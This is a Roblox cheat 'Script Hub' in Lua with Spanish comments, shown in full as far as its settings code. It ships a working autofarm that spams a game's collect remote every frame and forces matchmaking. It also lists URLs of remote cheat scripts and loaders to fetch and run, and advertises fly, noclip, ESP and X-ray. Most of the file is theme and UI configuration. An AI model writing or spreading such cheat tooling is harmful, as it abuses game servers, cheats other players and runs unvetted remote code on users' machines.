--[[
	SCRIPT HUB v2
	- Detecta el juego en el que estas y muestra tu perfil + metricas en vivo
	- Buscador de scripts de ScriptBlox integrado (trending, busqueda, scripts de este juego, filtros)
	- Script universal incluido (fly, noclip, speed, fullbright...)
	- Favoritos, historial y scripts propios por juego (tabla GAMES)
	- Ajustes: colores, fondo, escala, transparencia, tecla del hub... se guardan en un archivo
	- v3.0: pestana Tools (servidor, jugadores, waypoints, FPS booster, info del ejecutor), toasts,
	        panic key, export/import de ajustes, ESP, X-ray, anti-void, gravedad, hora del dia, favoritos en Home...
	- v2.2: pregunta "Are you sure?" al cerrar el hub y el universal (se puede desactivar en Settings)
	        + 10 temas nuevos con fondos propios (Synthwave, Matrix, Galaxy, Sakura, Light, Dracula...)
	- v2.1 (fixed): correcciones de bugs (ver REPORTE) + iconos/descripciones opcionales por juego
	- NUEVO: esquina inferior derecha para cambiar el tamano del hub y del script universal
	         (arrastrala; doble toque = tamano original; el tamano se guarda)

	Para agregar un script propio a un juego: añade una entrada en GAMES (mas abajo).
]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")
local Stats = game:GetService("Stats")

local player = Players.LocalPlayer

-- ===================================================================
-- CONFIG
-- ===================================================================
local HUB_NAME = "Script Hub"
local UNIVERSAL_TOGGLE_KEY = Enum.KeyCode.RightShift   -- ocultar / mostrar el script universal
local SCRIPTBLOX = "https://scriptblox.com"
local SETTINGS_FILE = "ScriptHub_settings.json"

-- Scripts propios por juego.
--   gameIds  = game.GameId  (id de la experiencia/universo)
--   placeIds = game.PlaceId (id del lugar concreto), opcional
--   scripts  = lista de scripts de ese juego; cada uno con:
--                url    = enlace raw al script        (o)
--                source = el script pegado directamente: source = [==[ ...codigo... ]==]
--   (atajo: tambien puedes poner url / source directamente en el juego, sin "scripts")
local GAMES = {
	{
		name = "Murder Mystery 2",
		gameIds = { 66654135 },
		placeIds = { 142823291 },
		scripts = {
			{ name = "Coin autofarm", url = "https://raw.githubusercontent.com/WillyWonka24755w/mm2autofarm/main/coin_tp.lua" },
		},
	},

	{
		name = "Duels",
		-- 135856908115931 tiene pinta de PlaceId; se pone en las dos listas por si acaso
		gameIds = { 135856908115931 },
		placeIds = { 135856908115931 },
		scripts = {
			{
				name = "Autofarm",
				source = [=====[
-- ==========================================================
-- ☁️ LIGHT NETWORK AUTOFARM (PARCHE DEFINITIVO PARA DELTA iOS) ☁️
-- Cero Emojis - Texto en Doble Capa - Desplegable en Acordeón
-- ==========================================================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
-- COLORES TEMA CLARO (Estilo iOS)
local cFondo = Color3.fromRGB(245, 245, 250)
local cAcento = Color3.fromRGB(0, 122, 255)
local cTextoOscuro = Color3.new(0, 0, 0) -- Negro puro para máxima legibilidad
local cTextoClaro = Color3.fromRGB(255, 255, 255)
local cBarraSup = Color3.fromRGB(230, 230, 235)
-- Variables de Estado
local isFarming = false
local spamConnection = nil
-- ==========================================================
-- 🛠 FUNCIONES DE BÚSQUEDA SEGURA (LAZY LOADING)
-- ==========================================================
local function GetRemote(remoteType)
local packages = ReplicatedStorage:FindFirstChild("Packages")
if not packages then return nil end
local networking = packages:FindFirstChild("Networking")
if not networking then return nil end
if remoteType == "collect" then
return networking:FindFirstChild("RE/Events/CollectEventSpawnable")
elseif remoteType == "match" then
return networking:FindFirstChild("RE/Matchmaking/Matchmaking")
end
return nil
end
local function Notificar(titulo, texto)
pcall(function()
game.StarterGui:SetCore("SendNotification", {
Title = titulo,
Text = texto,
Duration = 3
})
end)
end
local function IniciarFarm()
if isFarming then return end
local collectEvent = GetRemote("collect")
if not collectEvent then
Notificar("Error", "No se encontro el recolector.")
return
end
isFarming = true
Notificar("Auto Farm", "Iniciado...")
spamConnection = RunService.RenderStepped:Connect(function()
if isFarming then
pcall(function() collectEvent:FireServer() end)
end
end)
end
local function DetenerFarm()
if not isFarming then return end
isFarming = false
if spamConnection then
spamConnection:Disconnect()
spamConnection = nil
end
Notificar("Auto Farm", "Detenido.")
end
local function ForzarMatch(modo)
local matchEvent = GetRemote("match")
if matchEvent then
Notificar("Matchmaking", "Entrando a " .. modo .. "...")
pcall(function() matchEvent:FireServer("play", { mode = modo }) end)
else
Notificar("Error", "Evento no encontrado.")
end
end
-- ==========================================================
-- 📱 LIGHT NATIVE UI (PARCHE DE TEXTOS PARA MÓVIL)
-- ==========================================================
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
if playerGui:FindFirstChild("MVS_Light_UI") then
playerGui.MVS_Light_UI:Destroy()
end
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MVS_Light_UI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.Parent = playerGui
-- MARCO PRINCIPAL
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 250, 0, 320) -- Un poco más alto para el desplegable
MainFrame.Position = UDim2.new(0.5, -125, 0.5, -160)
MainFrame.BackgroundColor3 = cFondo
MainFrame.ClipsDescendants = false
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.ZIndex = 1
MainFrame.Parent = ScreenGui
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame
local MainStroke = Instance.new("UIStroke")
MainStroke.Thickness = 2
MainStroke.Color = Color3.fromRGB(200, 200, 205)
MainStroke.Parent = MainFrame
-- Esquina interactiva de Resize
local ResizeGrip = Instance.new("TextButton")
ResizeGrip.Size = UDim2.new(0, 25, 0, 25)
ResizeGrip.Position = UDim2.new(1, -25, 1, -25)
ResizeGrip.BackgroundTransparency = 1
ResizeGrip.Text = "O"
ResizeGrip.TextColor3 = Color3.fromRGB(180, 180, 185)
ResizeGrip.TextSize = 14
ResizeGrip.ZIndex = 10
ResizeGrip.Parent = MainFrame
local isResizing = false
local dragStart, startSize
ResizeGrip.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
isResizing = true
dragStart = input.Position
startSize = MainFrame.Size
end
end)
local resizeConn1 = UserInputService.InputChanged:Connect(function(input)
if isResizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
local delta = input.Position - dragStart
MainFrame.Size = UDim2.new(0, math.max(200, startSize.X.Offset + delta.X), 0, math.max(260, startSize.Y.Offset + delta.Y))
end
end)
local resizeConn2 = UserInputService.InputEnded:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
isResizing = false
end
end)
-- BARRA SUPERIOR
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = cBarraSup
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 12)
local TitleBarBottomFix = Instance.new("Frame")
TitleBarBottomFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarBottomFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarBottomFix.BackgroundColor3 = cBarraSup
TitleBarBottomFix.BorderSizePixel = 0
TitleBarBottomFix.ZIndex = 2
TitleBarBottomFix.Parent = TitleBar
local TitleText = Instance.new("TextLabel")
TitleText.Size = UDim2.new(0.6, 0, 1, 0)
TitleText.Position = UDim2.new(0.05, 0, 0, 0)
TitleText.BackgroundTransparency = 1
TitleText.Text = "NETWORK HUB"
TitleText.TextColor3 = cTextoOscuro
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextScaled = false
TitleText.TextSize = 16
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.ZIndex = 3
TitleText.Parent = TitleBar
-- Botón Cerrar (X) Separado en 2 capas
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -35, 0.5, -15)
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 59, 48)
CloseBtn.Text = ""
CloseBtn.ZIndex = 4
CloseBtn.Parent = TitleBar
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
local CloseLbl = Instance.new("TextLabel")
CloseLbl.Size = UDim2.new(1, 0, 1, 0)
CloseLbl.BackgroundTransparency = 1
CloseLbl.Text = "X"
CloseLbl.TextColor3 = cTextoClaro
CloseLbl.Font = Enum.Font.SourceSansBold
CloseLbl.TextSize = 16
CloseLbl.ZIndex = 5
CloseLbl.Parent = CloseBtn
CloseBtn.MouseButton1Click:Connect(function()
DetenerFarm() -- FIX: antes cerrar la ventana dejaba el autofarm disparando cada frame sin forma de pararlo
resizeConn1:Disconnect()
resizeConn2:Disconnect()
ScreenGui:Destroy()
end)
-- Botón Minimizar (-)
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 30, 0, 30)
MinBtn.Position = UDim2.new(1, -70, 0.5, -15)
MinBtn.BackgroundColor3 = Color3.fromRGB(142, 142, 147)
MinBtn.Text = ""
MinBtn.ZIndex = 4
MinBtn.Parent = TitleBar
Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 6)
local MinLbl = Instance.new("TextLabel")
MinLbl.Size = UDim2.new(1, 0, 1, 0)
MinLbl.BackgroundTransparency = 1
MinLbl.Text = "-"
MinLbl.TextColor3 = cTextoClaro
MinLbl.Font = Enum.Font.SourceSansBold
MinLbl.TextSize = 16
MinLbl.ZIndex = 5
MinLbl.Parent = MinBtn
local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(1, 0, 0, 2)
Divider.Position = UDim2.new(0, 0, 1, 0)
Divider.BackgroundColor3 = cAcento
Divider.BorderSizePixel = 0
Divider.ZIndex = 3
Divider.Parent = TitleBar
-- CONTENEDOR DE BOTONES (SCROLLING FRAME PARA EVITAR QUE SE CORTEN)
local ButtonsContainer = Instance.new("ScrollingFrame")
ButtonsContainer.Size = UDim2.new(1, 0, 1, -50)
ButtonsContainer.Position = UDim2.new(0, 0, 0, 50)
ButtonsContainer.BackgroundTransparency = 1
ButtonsContainer.ScrollBarThickness = 4
ButtonsContainer.ScrollBarImageColor3 = Color3.fromRGB(200, 200, 205)
ButtonsContainer.ZIndex = 2
ButtonsContainer.Parent = MainFrame
local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = ButtonsContainer
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 10)
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-- Ajustar el tamaño del scroll dinámicamente
UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
ButtonsContainer.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
end)
-- EL TRUCO MAESTRO: Botón y Texto separados (FIX DELTA iOS)
local function CreateLightButton(text, order, color1, color2, parent, callback, width, height, textColor)
width = width or 210
height = height or 45
local Btn = Instance.new("TextButton")
Btn.Size = UDim2.new(0, width, 0, height)
Btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Btn.Text = "" -- Texto vacío en el botón! Evita el crasheo de Delta.
Btn.ZIndex = parent.ZIndex + 1
Btn.LayoutOrder = order
Btn.AutoButtonColor = false
Btn.Parent = parent
Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
local BtnGradient = Instance.new("UIGradient")
BtnGradient.Color = ColorSequence.new{
ColorSequenceKeypoint.new(0, color1),
ColorSequenceKeypoint.new(1, color2)
}
BtnGradient.Parent = Btn
local BtnStroke = Instance.new("UIStroke")
BtnStroke.Thickness = 1
BtnStroke.Color = Color3.fromRGB(200, 200, 205)
BtnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
BtnStroke.Parent = Btn
-- ETIQUETA DE TEXTO FLOTANTE (Aquí va la palabra real)
local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1, 0, 1, 0)
Label.BackgroundTransparency = 1
Label.Text = text
Label.TextColor3 = textColor or cTextoClaro
Label.Font = Enum.Font.SourceSansBold
Label.TextScaled = false
Label.TextSize = 15
Label.ZIndex = Btn.ZIndex + 1 -- Encima del gradiente
Label.Parent = Btn
Btn.MouseButton1Click:Connect(callback)
-- Animación nativa simple
Btn.MouseButton1Down:Connect(function()
TweenService:Create(Btn, TweenInfo.new(0.1), {Size = UDim2.new(0, width - 10, 0, height - 4)}):Play()
end)
Btn.MouseButton1Up:Connect(function()
TweenService:Create(Btn, TweenInfo.new(0.1), {Size = UDim2.new(0, width, 0, height)}):Play()
end)
Btn.MouseLeave:Connect(function()
TweenService:Create(Btn, TweenInfo.new(0.1), {Size = UDim2.new(0, width, 0, height)}):Play()
end)
return Btn, Label
end
-- COLORES DE BOTONES TEMA CLARO
local cGreen1, cGreen2 = Color3.fromRGB(52, 199, 89), Color3.fromRGB(40, 167, 69)
local cRed1, cRed2 = Color3.fromRGB(255, 59, 48), Color3.fromRGB(220, 53, 69)
local cBlue1, cBlue2 = cAcento, Color3.fromRGB(0, 100, 220)
-- Creación de los Botones Principales
CreateLightButton("INICIAR FARM", 1, cGreen1, cGreen2, ButtonsContainer, IniciarFarm)
CreateLightButton("DETENER FARM", 2, cRed1, cRed2, ButtonsContainer, DetenerFarm)
-- EL NUEVO DESPLEGABLE EN ACORDEÓN (No se superpone, no se vuelve blanco)
local DropdownOptions = Instance.new("Frame")
DropdownOptions.Size = UDim2.new(1, 0, 0, 170)
DropdownOptions.BackgroundTransparency = 1
DropdownOptions.LayoutOrder = 4
DropdownOptions.Visible = false
DropdownOptions.ZIndex = ButtonsContainer.ZIndex
DropdownOptions.Parent = ButtonsContainer
local DropList = Instance.new("UIListLayout", DropdownOptions)
DropList.SortOrder = Enum.SortOrder.LayoutOrder
DropList.Padding = UDim.new(0, 6)
DropList.HorizontalAlignment = Enum.HorizontalAlignment.Center
-- Botón Maestro del Dropdown
local btnDropdown, dropLbl = CreateLightButton("ELEGIR MODO ▼", 3, cBlue1, cBlue2, ButtonsContainer, function()
DropdownOptions.Visible = not DropdownOptions.Visible
if DropdownOptions.Visible then
dropLbl.Text = "CERRAR MODOS ▲"
else
dropLbl.Text = "ELEGIR MODO ▼"
end
end)
-- Sub-Botones (Opciones del menú)
local cOpt1, cOpt2 = Color3.fromRGB(240, 240, 245), Color3.fromRGB(225, 225, 230)
local modos = {"1v1", "2v2", "3v3", "4v4"}
for i, modo in ipairs(modos) do
-- Usamos texto NEGRO (cTextoOscuro) sobre fondo gris claro
CreateLightButton("ENTRAR " .. modo, i, cOpt1, cOpt2, DropdownOptions, function()
DropdownOptions.Visible = false
dropLbl.Text = "MODO: " .. modo .. " ▼"
ForzarMatch(modo)
end, 190, 36, cTextoOscuro)
end
-- BOTÓN FLOTANTE (Para minimizar todo)
local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
ToggleBtn.Position = UDim2.new(0, 15, 0.5, -25)
ToggleBtn.BackgroundColor3 = cFondo
ToggleBtn.Text = "" -- Vacío para evitar glitches
ToggleBtn.ZIndex = 10
ToggleBtn.Parent = ScreenGui
local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(1, 0)
ToggleCorner.Parent = ToggleBtn
local ToggleStroke = Instance.new("UIStroke")
ToggleStroke.Thickness = 2
ToggleStroke.Color = cAcento
ToggleStroke.Parent = ToggleBtn
local ToggleLbl = Instance.new("TextLabel")
ToggleLbl.Size = UDim2.new(1, 0, 1, 0)
ToggleLbl.BackgroundTransparency = 1
ToggleLbl.Text = "MENU"
ToggleLbl.TextColor3 = cTextoOscuro
ToggleLbl.Font = Enum.Font.SourceSansBold
ToggleLbl.TextSize = 14
ToggleLbl.ZIndex = 11
ToggleLbl.Parent = ToggleBtn
local function ToggleMenuVisibility()
MainFrame.Visible = not MainFrame.Visible
TweenService:Create(ToggleBtn, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0, 45, 0, 45)}):Play()
task.wait(0.1)
TweenService:Create(ToggleBtn, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0, 50, 0, 50)}):Play()
end
ToggleBtn.MouseButton1Click:Connect(ToggleMenuVisibility)
MinBtn.MouseButton1Click:Connect(ToggleMenuVisibility)
]=====],
			},
			{ name = "Duels Hub", url = "https://yisus-hub.vercel.app/api/script/loader" },
		},
	},

	-- Plantilla para añadir mas (copia, pega y cambia los datos):
	-- {
	-- 	name = "Nombre del juego",                 -- titulo que se ve en el hub
	-- 	gameIds = { 0 },                           -- game.GameId (o placeIds = { 0 } con game.PlaceId)
	-- 	icon = 0,                                  -- OPCIONAL: imagen del juego (ID, rbxassetid://ID o link .png/.jpg)
	-- 	scripts = {
	-- 		{
	-- 			name = "Mi script",                   -- nombre del boton
	-- 			desc = "Autofarm de monedas",         -- OPCIONAL: texto corto bajo el nombre (pestaña Library)
	-- 			icon = 0,                              -- OPCIONAL: imagen propia de este script
	-- 			url = "https://raw.githubusercontent.com/USUARIO/REPO/main/archivo.lua",  -- o  source = [==[ codigo ]==]
	-- 		},
	-- 	},
	-- },
}

-- normaliza: un juego con url/source directo pasa a tener una lista "scripts"
for gi, g in GAMES do
	g.name = g.name or ("Game " .. gi)
	if not g.scripts then
		g.scripts = { { name = g.name, url = g.url, source = g.source, desc = g.desc } }
	end
	if not (g.gameIds or g.placeIds) then
		warn(("[ScriptHub] '%s' no tiene gameIds ni placeIds: nunca se detectara"):format(g.name))
	end
	for si, s in g.scripts do
		s.name = s.name or ("Script " .. si)
		if not (s.url or s.source) then
			warn(("[ScriptHub] '%s' / '%s' no tiene url ni source"):format(g.name, s.name))
		end
	end
end

-- ===================================================================
-- AJUSTES (se guardan en el archivo si tu ejecutor soporta writefile)
-- ===================================================================
local ACCENTS = {
	{ name = "Violet",  a = Color3.fromRGB(124, 92, 255), b = Color3.fromRGB(70, 140, 255) },
	{ name = "Ocean",   a = Color3.fromRGB(40, 150, 255), b = Color3.fromRGB(40, 220, 230) },
	{ name = "Emerald", a = Color3.fromRGB(40, 190, 120), b = Color3.fromRGB(110, 225, 160) },
	{ name = "Rose",    a = Color3.fromRGB(240, 80, 140), b = Color3.fromRGB(255, 130, 100) },
	{ name = "Sunset",  a = Color3.fromRGB(255, 140, 50), b = Color3.fromRGB(255, 80, 80) },
	{ name = "Gold",    a = Color3.fromRGB(240, 190, 50), b = Color3.fromRGB(255, 140, 60) },
	{ name = "Ice",     a = Color3.fromRGB(150, 200, 255), b = Color3.fromRGB(190, 160, 255) },
}

local BACKGROUNDS = {
	{ name = "Dark",     bg = Color3.fromRGB(14, 14, 19), card = Color3.fromRGB(23, 23, 31), card2 = Color3.fromRGB(33, 33, 44), line = Color3.fromRGB(46, 46, 60) },
	{ name = "Midnight", bg = Color3.fromRGB(8, 10, 22),  card = Color3.fromRGB(14, 18, 36), card2 = Color3.fromRGB(22, 28, 52), line = Color3.fromRGB(36, 44, 78) },
	{ name = "Amoled",   bg = Color3.fromRGB(0, 0, 0),    card = Color3.fromRGB(12, 12, 14), card2 = Color3.fromRGB(22, 22, 26), line = Color3.fromRGB(38, 38, 44) },
	{ name = "Slate",    bg = Color3.fromRGB(24, 26, 32), card = Color3.fromRGB(34, 37, 46), card2 = Color3.fromRGB(46, 50, 62), line = Color3.fromRGB(62, 67, 82) },
}

local function pickFont(name, fallback)
	local ok, f = pcall(function() return Enum.Font[name] end)
	return (ok and f) or fallback
end

-- estilos: tipografia, redondeo de esquinas, grosor de bordes y decoracion de la cabecera
local STYLES = {
	modern = {
		font = Enum.Font.Gotham, fontMedium = Enum.Font.GothamMedium, fontBold = Enum.Font.GothamBold,
		round = 1, stroke = 1, textScale = 1, art = "modern",
	},
	-- plataformas 8-bit: esquinas cuadradas, bordes gruesos, letra pixelada con sombra,
	-- botones con relieve tipo bloque y una franja de ladrillos en la cabecera
	mario = {
		font = pickFont("Arcade", Enum.Font.GothamBold),
		fontMedium = pickFont("Arcade", Enum.Font.GothamBold),
		fontBold = pickFont("Arcade", Enum.Font.GothamBold),
		round = 0, stroke = 2, textScale = 0.85, deco = "bricks", art = "mario",
		textStroke = 0.5, bevel = true, flatHeader = true,
	},
	-- terminal: letra monoespaciada, esquinas casi rectas, lluvia de codigo
	terminal = {
		font = Enum.Font.Code, fontMedium = Enum.Font.Code, fontBold = Enum.Font.Code,
		round = 0.4, stroke = 1, textScale = 0.92, art = "matrix",
	},
	synth = {
		font = Enum.Font.Gotham, fontMedium = Enum.Font.GothamMedium, fontBold = Enum.Font.GothamBold,
		round = 1, stroke = 1, textScale = 1, art = "synth",
	},
	galaxy = {
		font = Enum.Font.Gotham, fontMedium = Enum.Font.GothamMedium, fontBold = Enum.Font.GothamBold,
		round = 1.2, stroke = 1, textScale = 1, art = "stars",
	},
	sakura = {
		font = Enum.Font.Gotham, fontMedium = Enum.Font.GothamMedium, fontBold = Enum.Font.GothamBold,
		round = 1.4, stroke = 1, textScale = 1, art = "sakura",
	},
}

-- presets: Custom usa tus colores; "Mario Bros" trae colores + estilo + fondo propios
local PRESETS = {
	{ name = "Custom", desc = "Pick your own accent color and background", style = "modern" },
	{
		name = "Mario Bros", desc = "8-bit platformer: brick panels, pipe-green buttons, sky blue", style = "mario",
		-- Enlace directo (o ID de Roblox) de TU imagen de fondo para este preset.
		-- Sube tu captura al repo con este nombre; si no existe, se usa el fondo dibujado por codigo.
		imageUrl = "https://raw.githubusercontent.com/WillyWonka24755w/mm2autofarm/main/mario_bg.png",
		colors = {
			bg = Color3.fromRGB(92, 148, 252), card = Color3.fromRGB(190, 72, 10), card2 = Color3.fromRGB(232, 112, 32),
			line = Color3.fromRGB(20, 20, 20), accent = Color3.fromRGB(0, 168, 0), accent2 = Color3.fromRGB(96, 224, 80),
			text = Color3.fromRGB(255, 255, 255), sub = Color3.fromRGB(255, 232, 176), onAccent = Color3.fromRGB(255, 255, 255),
		},
	},
	{
		name = "Neon Synthwave", desc = "Retro sunset with a neon grid", style = "synth",
		colors = {
			bg = Color3.fromRGB(22, 10, 40), card = Color3.fromRGB(40, 18, 70), card2 = Color3.fromRGB(62, 28, 104),
			line = Color3.fromRGB(140, 50, 200), accent = Color3.fromRGB(255, 60, 180), accent2 = Color3.fromRGB(90, 200, 255),
			text = Color3.fromRGB(255, 255, 255), sub = Color3.fromRGB(205, 175, 245), onAccent = Color3.fromRGB(255, 255, 255),
		},
	},
	{
		name = "Matrix", desc = "Green terminal with falling code", style = "terminal",
		colors = {
			bg = Color3.fromRGB(0, 10, 2), card = Color3.fromRGB(4, 24, 8), card2 = Color3.fromRGB(8, 42, 14),
			line = Color3.fromRGB(0, 110, 30), accent = Color3.fromRGB(0, 220, 70), accent2 = Color3.fromRGB(140, 255, 160),
			text = Color3.fromRGB(170, 255, 180), sub = Color3.fromRGB(70, 170, 90), onAccent = Color3.fromRGB(0, 20, 0),
		},
	},
	{
		name = "Galaxy", desc = "Deep space with stars and nebulae", style = "galaxy",
		colors = {
			bg = Color3.fromRGB(8, 8, 26), card = Color3.fromRGB(16, 16, 46), card2 = Color3.fromRGB(28, 26, 76),
			line = Color3.fromRGB(70, 60, 140), accent = Color3.fromRGB(140, 110, 255), accent2 = Color3.fromRGB(90, 200, 255),
			text = Color3.fromRGB(235, 235, 255), sub = Color3.fromRGB(150, 150, 205), onAccent = Color3.fromRGB(255, 255, 255),
		},
	},
	{
		name = "Sakura", desc = "Soft pink cherry blossoms (light theme)", style = "sakura",
		colors = {
			bg = Color3.fromRGB(255, 236, 243), card = Color3.fromRGB(255, 250, 252), card2 = Color3.fromRGB(255, 214, 228),
			line = Color3.fromRGB(240, 170, 195), accent = Color3.fromRGB(236, 90, 140), accent2 = Color3.fromRGB(255, 150, 170),
			text = Color3.fromRGB(70, 30, 50), sub = Color3.fromRGB(150, 100, 120), onAccent = Color3.fromRGB(255, 255, 255),
		},
	},
	{
		name = "Clean Light", desc = "Bright, minimal light theme", style = "modern",
		colors = {
			bg = Color3.fromRGB(242, 244, 248), card = Color3.fromRGB(255, 255, 255), card2 = Color3.fromRGB(232, 235, 242),
			line = Color3.fromRGB(208, 212, 224), accent = Color3.fromRGB(60, 110, 255), accent2 = Color3.fromRGB(90, 170, 255),
			text = Color3.fromRGB(25, 28, 38), sub = Color3.fromRGB(110, 116, 135), onAccent = Color3.fromRGB(255, 255, 255),
		},
	},
	{
		name = "Dracula", desc = "Classic purple/pink dark palette", style = "modern",
		colors = {
			bg = Color3.fromRGB(40, 42, 54), card = Color3.fromRGB(52, 55, 70), card2 = Color3.fromRGB(68, 71, 90),
			line = Color3.fromRGB(98, 114, 164), accent = Color3.fromRGB(189, 147, 249), accent2 = Color3.fromRGB(255, 121, 198),
			text = Color3.fromRGB(248, 248, 242), sub = Color3.fromRGB(165, 170, 195), onAccent = Color3.fromRGB(255, 255, 255),
		},
	},
	{
		name = "Blood Moon", desc = "Black and crimson", style = "galaxy",
		colors = {
			bg = Color3.fromRGB(16, 4, 6), card = Color3.fromRGB(30, 8, 12), card2 = Color3.fromRGB(50, 12, 18),
			line = Color3.fromRGB(110, 24, 34), accent = Color3.fromRGB(230, 40, 60), accent2 = Color3.fromRGB(255, 120, 80),
			text = Color3.fromRGB(255, 235, 235), sub = Color3.fromRGB(195, 135, 140), onAccent = Color3.fromRGB(255, 255, 255),
		},
	},
	{
		name = "Ocean Depths", desc = "Deep blue with aqua accents", style = "modern",
		colors = {
			bg = Color3.fromRGB(4, 22, 38), card = Color3.fromRGB(8, 40, 64), card2 = Color3.fromRGB(14, 62, 96),
			line = Color3.fromRGB(30, 110, 150), accent = Color3.fromRGB(0, 200, 230), accent2 = Color3.fromRGB(120, 240, 220),
			text = Color3.fromRGB(225, 248, 255), sub = Color3.fromRGB(120, 180, 200), onAccent = Color3.fromRGB(0, 25, 35),
		},
	},
	{
		name = "Forest", desc = "Dark green and moss", style = "modern",
		colors = {
			bg = Color3.fromRGB(14, 28, 18), card = Color3.fromRGB(22, 44, 28), card2 = Color3.fromRGB(34, 66, 42),
			line = Color3.fromRGB(60, 110, 70), accent = Color3.fromRGB(110, 200, 90), accent2 = Color3.fromRGB(200, 230, 110),
			text = Color3.fromRGB(235, 250, 230), sub = Color3.fromRGB(140, 180, 140), onAccent = Color3.fromRGB(10, 30, 10),
		},
	},
	{
		name = "Gold Luxury", desc = "Black with gold details", style = "modern",
		colors = {
			bg = Color3.fromRGB(12, 10, 6), card = Color3.fromRGB(26, 22, 12), card2 = Color3.fromRGB(44, 36, 18),
			line = Color3.fromRGB(120, 96, 40), accent = Color3.fromRGB(240, 190, 60), accent2 = Color3.fromRGB(255, 225, 130),
			text = Color3.fromRGB(255, 246, 220), sub = Color3.fromRGB(180, 160, 110), onAccent = Color3.fromRGB(30, 20, 0),
		},
	},
}

-- tamanos de ventana: se cambian arrastrando la esquina inferior derecha de cada ventana
local SIZE_LIMITS = {
	hub = { defaultW = 440, defaultH = 590, minW = 420, minH = 430, maxW = 800, maxH = 900 },
	uni = { defaultW = 360, defaultH = 480, minW = 300, minH = 320, maxW = 640, maxH = 900 },
}

local DEFAULTS = {
	confirmClose = true,
	toasts = true,
	autoUniversal = false,
	hotkeys = false,
	shuffle = false,
	panicKey = "End",
	uniCfg = {},
	waypoints = {},
	hubW = SIZE_LIMITS.hub.defaultW,
	hubH = SIZE_LIMITS.hub.defaultH,
	uniW = SIZE_LIMITS.uni.defaultW,
	uniH = SIZE_LIMITS.uni.defaultH,
	bgArt = true,
	bgArtOpacity = 0.5,
	bgImage = "",
	preset = "Mario Bros",
	volume = 0.6,
	musicLoop = false,
	autoNext = true,
	accent = "Violet",
	background = "Dark",
	scale = 1,
	transparency = 0,
	hubKey = "RightControl",
	askBeforeRun = true,
	verifiedOnly = false,
	autoRunGame = false,
}

local settings = {}
local function resetSettings(keepData)
	local favs, hist, plist, wps = settings.favorites, settings.history, settings.playlist, settings.waypoints
	table.clear(settings)
	for k, v in DEFAULTS do settings[k] = v end
	settings.favorites = keepData and favs or {}
	settings.history = keepData and hist or {}
	settings.playlist = keepData and plist or {}
	settings.waypoints = (keepData and type(wps) == "table") and wps or {}
	settings.uniCfg = {}
end
resetSettings(false)

local function loadSettings()
	if not (isfile and readfile) then return end
	local ok, data = pcall(function()
		if isfile(SETTINGS_FILE) then
			return HttpService:JSONDecode(readfile(SETTINGS_FILE))
		end
	end)
	if ok and type(data) == "table" then
		for k, v in data do
			if DEFAULTS[k] ~= nil and type(v) == type(DEFAULTS[k]) then settings[k] = v end
		end
		-- solo se aceptan entradas validas (un archivo editado a mano / corrupto ya no rompe el hub)
		local function clean(list, key)
			local out = {}
			if type(list) == "table" then
				for _, item in list do
					if type(item) == "table" and type(item[key]) == "string" and item[key] ~= "" then
						table.insert(out, item)
					end
				end
			end
			return out
		end
		settings.favorites = clean(data.favorites, "slug")
		settings.history = clean(data.history, "slug")
		settings.playlist = clean(data.playlist, "source")
		settings.waypoints = type(data.waypoints) == "table" and data.waypoints or {}
		settings.uniCfg = type(data.uniCfg) == "table" and data.uniCfg or {}
	end
end
loadSettings()
do -- si el preset guardado ya no existe, se usa el predeterminado
	local valid = false
	for _, p in PRESETS do
		if p.name == settings.preset then valid = true end
	end
	if not valid then settings.preset = DEFAULTS.preset end
end

